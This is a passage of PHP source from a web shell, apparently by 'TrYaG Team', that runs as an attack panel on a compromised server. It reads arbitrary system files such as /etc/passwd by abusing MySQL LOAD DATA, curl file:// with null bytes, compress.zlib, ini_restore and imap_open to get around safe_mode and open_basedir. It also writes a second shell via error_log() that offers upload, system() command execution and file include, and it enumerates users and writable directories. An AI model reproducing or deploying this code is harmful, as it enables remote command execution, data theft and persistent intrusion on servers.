$tb->headerform(array('content'=>'<FONT COLOR=RED>Make file ERORR:</FONT><br>' .$tb->makeinput('ER','Mohajer22.php' ).$tb->makeinput('ER','Write','ER','submit')));


// read file SQL ( ) //
if(empty($_POST['Mohajer22'])){
} else {
echo "read file SQL","<br>" ;
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$file=$_POST['Mohajer22'];


$mysql_files_str = "/etc/passwd:/proc/cpuinfo:/etc/resolv.conf:/etc/proftpd.conf";
$mysql_files = explode(':', $mysql_files_str);

$sql = array (
"USE $mdb",
'CREATE TEMPORARY TABLE ' . ($tbl = 'A'.time ()) . ' (a LONGBLOB)',
"LOAD DATA LOCAL INFILE '$file' INTO TABLE $tbl FIELDS "
. "TERMINATED BY       '__THIS_NEVER_HAPPENS__' "
. "ESCAPED BY          '' "
. "LINES TERMINATED BY '__THIS_NEVER_HAPPENS__'",

"SELECT a FROM $tbl LIMIT 1"
);
mysql_connect ($mhost, $muser, $mpass);

								foreach ($sql as $statement) {
								   $q = mysql_query ($statement);

								   if ($q == false) die (
								      "FAILED: " . $statement . "\n" .
								      "REASON: " . mysql_error () . "\n"
								   );

								   if (! $r = @mysql_fetch_array ($q, MYSQL_NUM)) continue;

								   echo htmlspecialchars($r[0]);
								   mysql_free_result ($q);
								}
echo "</textarea>";
}
// ERORR //
if(empty($_POST['ER'])){
} else {
$ERORR=$_POST['ER'];
echo  error_log("
<html>
<head>
<title> Exploit: error_log() By * TrYaG Team  * </title>
<body bgcolor=\"#000000\">
<table Width='100%' height='10%' bgcolor='#8C0404' border='1'>
<tr>
<td><center><font size='6' color='#BBB516'> By  TrYaG Team</font></center></td>
</tr>
</table>
<font color='#FF0000'>
</head>
<?
if(\$fileup == \"\"){
ECHO \" reade for up \";
}else{
\$path= exec(\"pwd\");
\$path .= \"/\$fileup_name\";
\$CopyFile = copy(\$fileup,\"\$path\");
if(\$CopyFile){
echo \" up ok \";
}else{
echo \" no up \";
}
}
if(empty(\$_POST['m'])){
} else {
\$m=\$_POST['m'];
echo  system(\$m);
}
if(empty(\$_POST['cmd'])){
} else {
\$h=  \$_POST['cmd'];
 print include(\$h) ;
}
?>
<form method='POST' enctype='multipart/form-data' >
<input type='file' name='fileup' size='20'>
<input type='submit' value='  up  '>
</form>
<form method='POST'  >
<input type='cmd' name='cmd' size='20'>
<input type='submit' value='  open (shill.txt) '>
</form>
<form method='POST' enctype='multipart/form-data' >
<input type='text' name='m' size='20'>
<input type='submit' value='  run  '>
<input type='reset' value=' reset '>
</form>
", 3,$ERORR);
}

// id //,DJ,
if ($_POST['plugin'] ){
echo "read file id" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";



                                           for($uid=0;$uid<60000;$uid++){   //cat /etc/passwd
                                        $ara = posix_getpwuid($uid);
                                                if (!empty($ara)) {
                                                  while (list ($key, $val) = each($ara)){
                                                    print "$val:";
                                                  }
                                                  print "\n";
                                                }
                                        }
                                 echo "</textarea>";
                                break;


                                             }


// CURL //
if(empty($_POST['curl'])){

} else {
echo "read file CURL","<br>" ;
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['curl'];
$ch =
curl_init("file:///".$m."\x00/../../../../../../../../../../../../".__FILE__);
curl_exec($ch);
var_dump(curl_exec($ch));
echo "</textarea>";
}

// copy//
$u1p="";
$tymczas="";
if(empty($_POST['copy'])){
} else {
echo "read file copy" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$u1p=$_POST['copy'];
$temp=tempnam($tymczas, "cx");
if(copy("compress.zlib://".$u1p, $temp)){
$zrodlo = fopen($temp, "r");
$tekst = fread($zrodlo, filesize($temp));
fclose($zrodlo);
echo "".htmlspecialchars($tekst)."";
unlink($temp);
echo "</textarea>";
} else {
die("<FONT COLOR=\"RED\"><CENTER>Sorry... File
<B>".htmlspecialchars($u1p)."</B> dosen't exists or you don't have
access.</CENTER></FONT>");
}
}

/// ini_restore //
if(empty($_POST['M2'])){
} else {
echo "read file ini_restore","<br> ";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
$m=$_POST['M2'];
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$m");
ini_restore("safe_mode");
ini_restore("open_basedir");
echo ini_get("safe_mode");
echo ini_get("open_basedir");
$s=readfile("$m");
echo "</textarea>";
}

// imap //

$string = !empty($_POST['string']) ? $_POST['string'] : 0;
$switch = !empty($_POST['switch']) ? $_POST['switch'] : 0;

if ($string && $switch == "file") {
echo "read file imap" ,"<br>";
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";

$stream = imap_open($string, "", "");

$str = imap_body($stream, 1);
if (!empty($str))
echo "<pre>".$str."</pre>";
imap_close($stream);
echo "</textarea>";
} elseif ($string && $switch == "dir") {
echo "read  dir imap","<br>" ;
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";

$stream = imap_open("/etc/passwd", "", "");
if ($stream == FALSE)
die("Can't open imap stream");
$string = explode("|",$string);
if (count($string) > 1)
$dir_list = imap_list($stream, trim($string[0]), trim($string[1]));
else
$dir_list = imap_list($stream, trim($string[0]), "*");
echo "<pre>";
for ($i = 0; $i < count($dir_list); $i++)
echo "$dir_list[$i]"."<p>&nbsp;</p>" ;
echo "</pre>";
imap_close($stream);
echo "</textarea>";
}
$tb->tdbody ("</td></tr></table>");
// open dir //
$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: Open dir </b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');

if(empty($_POST['m'])){
echo "<div><FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>
<table id=tb><tr><td><FONT COLOR=\"RED\">path dir</FONT>
<INPUT type='text' name='m' size=70 value='./'>
<INPUT type='submit' value='show' id=input></td></tr></table></form></div>";

} else {
$m=$_POST['m'];
$spath = $m ;
$path = $m ;




        $method = intval(trim($_POST['method']));

        $handle = opendir($path);

        $_folders = array();

        $i = 0;

        while (false !== ($file = readdir($handle)))
        {
                $full_path = "$path/$file";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0777'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file;

                                $i++;
                        }
                }
        }


        closedir($handle);
        clearstatcache();



        echo '<strong><FONT COLOR=#00FF00>The folders is 777 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0755'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#FF9900>The folders is 755 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0644'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#CC9999>The folders is 644 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0750'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#9999CC>The folders is 750 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0604'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#669999>The folders is 604 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0705'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#336699>The folders is 705 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0606'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#996666>The folders is 606 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }
//////////
$handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);

                if ((is_dir($full_path)) && ($perms == '0703'))
                {
                        if (!file_exists('.*')) {

                                $_folders[$i] = $file1;

                                $i++;
                        }
                }
        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#3333FF>The folders is 703 :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }



  }
    $handle = opendir($path);

        $_folders = array();

        $i = 0;

 while (false !== ($file1 = readdir($handle)))
        {
                $full_path = "$path/$file1";
                $perms = substr(sprintf('%o', fileperms($full_path)), -4);




                                $_folders[$i] = $file1;

                                $i++;


        }



        clearstatcache();



        echo '</FONT><strong><FONT COLOR=#FFFF00>The folders and file all :</strong><br />';

        foreach ($_folders as $folder)
        {
                echo $folder.'<br />';
        }

        echo '</FONT><strong><FONT COLOR=#FF0000>The total  : </strong>'.$i.'</FONT><br />';
$tb->tdbody ("</td></tr></table>");

$tb->tableheader();
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td><b>Exploit: break fucking safe-mode </b></td></tr></table>','center','top');
$tb->tdbody('<table width="98%" border="0" cellpadding="0" cellspacing="0"><tr><td>');


  error_reporting(E_WARNING);
  ini_set("display_errors", 1);

  echo "<head><title>".getcwd()."</title></head>";

  echo "<form method=POST>";
  echo "<div style='float: left'><FONT COLOR=\"RED\">Root directory: </FONT><input type=text name=root value='{$_POST['root']}'></div>";
  echo "<input type=submit value='--&raquo;'></form>";



  // break fucking safe-mode !

  $root = "/";

  if($_POST['root']) $root = $_POST['root'];

  if (!ini_get('safe_mode')) die("<font size=-2 face=verdana color='#CC0000'>Safe-mode is OFF.</font>");
echo "<textarea method='POST' cols='95' rows='30' wrar='off' >";
  $c = 0; $D = array();
  set_error_handler("eh");

  $chars = "_-.01234567890abcdefghijklnmopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";

  for($i=0; $i < strlen($chars); $i++){
  $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}";

  $prevD = $D[count($D)-1];
  glob($path."*");

        if($D[count($D)-1] != $prevD){

        for($j=0; $j < strlen($chars); $j++){

           $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}";

           $prevD2 = $D[count($D)-1];
           glob($path."*");

              if($D[count($D)-1] != $prevD2){


                 for($p=0; $p < strlen($chars); $p++){

                 $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}";

                 $prevD3 = $D[count($D)-1];
                 glob($path."*");

                    if($D[count($D)-1] != $prevD3){


                       for($r=0; $r < strlen($chars); $r++){

                       $path ="{$root}".((substr($root,-1)!="/") ? "/" : NULL)."{$chars[$i]}{$chars[$j]}{$chars[$p]}{$chars[$r]}";
                       glob($path."*");

                       }

                    }

                 }

              }

        }

        }

  }

  $D = array_unique($D);


  foreach($D as $item) echo "{$item}\n";





  function eh($errno, $errstr, $errfile, $errline){

     global $D, $c, $i;
     preg_match("/SAFE\ MODE\ Restriction\ in\ effect\..*whose\ uid\ is(.*)is\ not\ allowed\ to\ access(.*)owned by uid(.*)/", $errstr, $o);
     if($o){ $D[$c] = $o[2]; $c++;}

  }
  echo "</textarea>";
$tb->tdbody ("</td></tr></table>");
?>

